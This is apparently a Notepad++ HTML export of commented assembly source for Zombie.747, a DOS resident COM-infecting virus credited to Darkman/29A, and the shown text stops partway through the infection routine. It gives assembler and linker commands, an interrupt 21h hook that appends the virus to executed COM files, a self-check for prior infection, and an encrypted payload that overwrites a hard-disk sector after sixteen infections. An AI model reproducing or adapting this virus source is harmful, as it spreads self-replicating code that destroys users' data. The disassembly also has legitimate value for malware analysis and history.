<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment *</span><span class="sc0">
</span><span class="sc1">;                    Zombie.747</span><span class="sc0">
</span><span class="sc1">;                  Disassembly by</span><span class="sc0">
</span><span class="sc1">;                   Darkman/29A</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Zombie.747 is a 747 bytes parasitic resident COM virus. Infects files at</span><span class="sc0">
</span><span class="sc1">;   load and execute program, except COMMAND.COM, by appending the virus to the</span><span class="sc0">
</span><span class="sc1">;   infected COM file.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   To compile Zombie.747 with Turbo Assembler v 4.0 type:</span><span class="sc0">
</span><span class="sc1">;     TASM /M ZOMBI747.ASM</span><span class="sc0">
</span><span class="sc1">;     TLINK /t /x ZOMBI747.OBJ</span><span class="sc0">
</span><span class="sc1">; *</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
 </span><span class="sc9">org</span><span class="sc0">   </span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">; Origin of Zombie.747</span><span class="sc0">

</span><span class="sc5">code_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_virus</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">virus_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta_offset</span><span class="sc0">
</span><span class="sc5">delta_offset</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">; BP = delta offset</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">virus_begin_</span><span class="sc0">
</span><span class="sc5">stack_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">stack_</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7ah</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; Stack</span><span class="sc0">
</span><span class="sc5">stack_begin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">int21_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; Address of interrupt 21h</span><span class="sc0">
</span><span class="sc5">virus_seg</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; Segment of virus</span><span class="sc0">
</span><span class="sc5">stack_seg</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; Stack segment</span><span class="sc0">
</span><span class="sc5">stack_ptr</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; Stack pointer</span><span class="sc0">
</span><span class="sc5">infect_off</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc0">
</span><span class="sc5">infect_mark</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; infection mark</span><span class="sc0">
</span><span class="sc5">infect_count</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">             </span><span class="sc1">; Infection counter</span><span class="sc0">
</span><span class="sc5">virus_offset</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">     </span><span class="sc1">; Offset of virus</span><span class="sc0">
</span><span class="sc5">infect_code</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">         </span><span class="sc1">; JMP imm16 (opcode 0e9h)</span><span class="sc0">
</span><span class="sc5">origin_code</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">      </span><span class="sc1">; Original code of infected file</span><span class="sc0">
</span><span class="sc5">code_begin_</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; Offset of beginning of code</span><span class="sc0">

</span><span class="sc5">int21_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">         </span><span class="sc1">; Interrupt 21h of Zombie.747</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">             </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">         </span><span class="sc1">; Load and execute program?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">load_and_exe</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to load_and_exe</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b69h</span><span class="sc0">         </span><span class="sc1">; Zombie.747 function?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">virus_functi</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to virus_functi</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">             </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_addr</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">virus_functi</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; Already resident</span><span class="sc0">

         </span><span class="sc6">popf</span><span class="sc0">             </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">             </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">load_and_exe</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_off</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">setup_stack</span><span class="sc0">

         </span><span class="sc6">popf</span><span class="sc0">             </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_addr</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">setup_stack</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">         </span><span class="sc1">; Setup stack of the virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stack_seg</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">],</span><span class="sc8">ss</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stack_ptr</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">],</span><span class="sc8">sp</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_seg</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stack_begin</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_off</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_count</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">],</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">load_stack</span><span class="sc0">      </span><span class="sc1">; Below or equal? Jump to load_stack</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">payload</span><span class="sc0">
</span><span class="sc5">load_stack</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stack_seg</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stack_ptr</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">payload</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">         </span><span class="sc1">; Payload of the virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypt_begin</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc5">crypt_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">decrypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Decrypt a byte</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Increase index register</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_loop</span><span class="sc0">
</span><span class="sc5">crypt_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">303h</span><span class="sc0">         </span><span class="sc1">; Write disk sector(s)</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc2">0dbh</span><span class="sc0">         </span><span class="sc1">; XOR BX,BX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">         </span><span class="sc1">; ES:BX = pointer to data buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; CX = sector- and cylinder number</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">         </span><span class="sc1">; DX = drive- and head number</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
</span><span class="sc5">crypt_end</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypt_begin</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc5">crypt_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">encrypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Encrypt a byte</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Increase index register</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt_loop</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">examine_file</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">         </span><span class="sc1">; Examine file</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
</span><span class="sc5">find_dot</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">             </span><span class="sc1">; AL = byte of filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">              </span><span class="sc1">; Found the dot in the filename</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">examine_fil_</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to examine_fil_</span><span class="sc0">

         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; End of filename?</span><span class="sc0">
         </span><span class="sc6">loopnz</span><span class="sc0">  </span><span class="sc5">find_dot</span><span class="sc0">         </span><span class="sc1">; Not zero? Jump to find_dot</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">examine_exit</span><span class="sc0">     </span><span class="sc1">; Zero? Jump to examine_exit</span><span class="sc0">
</span><span class="sc5">examine_fil_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = word of filename</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">         </span><span class="sc1">; Lowcase word of filename</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'mm'</span><span class="sc0">             </span><span class="sc1">; COMMAND.COM?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">examine_exit</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to examine_exit</span><span class="sc0">

         </span><span class="sc6">lodsw</span><span class="sc0">             </span><span class="sc1">; AX = word of extension</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">         </span><span class="sc1">; Lowcase word of extension</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'oc'</span><span class="sc0">             </span><span class="sc1">; Correct extension?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">examine_exit</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to examine_exit</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">             </span><span class="sc1">; AL = byte of extension</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">         </span><span class="sc1">; Lowcase byte of extension</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'m'</span><span class="sc0">              </span><span class="sc1">; Correct extension?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">examine_exit</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to examine_exit</span><span class="sc0">

         </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">examine_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">; Set carry flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">set_file_pos</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">         </span><span class="sc1">; Set current file position</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">; Zero CX</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">; Zero DX?</span><span class="sc0">
         </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">set_file_po_</span><span class="sc0">     </span><span class="sc1">; Positive? Jump to set_file_po_</span><span class="sc0">

         </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Invert each bit of low-order wor...</span><span class="sc0">
</span><span class="sc5">set_file_po_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">         </span><span class="sc1">; Set current file position</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">         </span><span class="sc1">; Infect COM file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">; SI = offset of filename</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">examine_file</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">open_file</span><span class="sc0">         </span><span class="sc1">; No error? Jump to open_file</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect_exit_</span><span class="sc0">
</span><span class="sc5">open_file</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">         </span><span class="sc1">; Open file (read/write)</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">         </span><span class="sc1">; No error? Jump to read_file</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect_exit_</span><span class="sc0">
</span><span class="sc5">read_file</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; BX = file handle</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">         </span><span class="sc1">; DX = code segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">; DS "  "      "</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">         </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">         </span><span class="sc1">; Read three bytes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">origin_code</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">examine_mark</span><span class="sc0">     </span><span class="sc1">; No error? Jump to examine_mark</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_file</span><span class="sc0">
</span><span class="sc5">examine_mark</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,-</span><span class="sc2">28h</span><span class="sc0">         </span><span class="sc1">; DX = low-order word of offset fr...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_pos</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; Error? Jump to close_file</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">         </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">         </span><span class="sc1">; Read four bytes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_mark</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; Error? Jump to close_file</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_mark</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">],</span><span class="sc12">'oZ'</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">calc_offset</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to calc_offset</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">infect_mark</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_begin</span><span class="sc4">],</span><span class="sc12">'bm'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">      </span><span class="sc1">; Previosly infected? Jump to clos...</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
